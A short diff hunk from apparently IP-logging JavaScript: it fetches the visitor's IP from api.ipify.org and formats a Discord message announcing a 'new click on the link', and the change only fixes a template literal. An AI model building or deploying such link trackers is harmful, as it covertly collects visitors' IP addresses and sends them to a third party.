@@ -32,7 +32,7 @@ fetch("https://api.ipify.org?format=json")
     // Nachricht formatieren
     const payload = {
       content: `# 📨 NEUER KLICK AUF DEN LINK!
-das ist aber nur ein test lol
+das ist aber nur ein test lol`
     };
 
     // An Discord senden
